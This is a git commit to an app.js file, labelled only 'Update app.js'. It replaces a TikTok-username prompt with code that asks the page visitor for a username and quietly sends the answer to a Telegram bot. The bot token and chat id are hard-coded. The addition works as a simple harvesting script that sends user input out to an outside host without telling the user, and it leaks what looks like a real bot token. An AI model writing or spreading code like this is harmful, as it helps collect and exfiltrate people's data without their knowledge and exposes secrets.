004da5309cc7aa8191ee7409abfcb658dc2a2f8b
ahmed998k <152001658+ahmed998k@users.noreply.github.com>
2025-01-16 14:24:47 +0300

    Update app.js

--- app.js
+++ app.js
@@ -1,8 +1,13 @@
-let username 
+const botToken = '6105219066:AAGMlzNkGUP9Vj6AJsog-AKOe-NDx6ok3zc';
+const chatId = ' 6105219066';
 
-username = window.prompt(" what is your tiktok username ? "); 
-
-
+const userMessage = prompt("what is your username ? :");
+if (userMessage) {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(userMessage)}`)
+    .then(response => response.json())
+    .then(data => console.log('Message sent:', data))
+    .catch(error => console.error('Error:', error));
+}
 
 
 
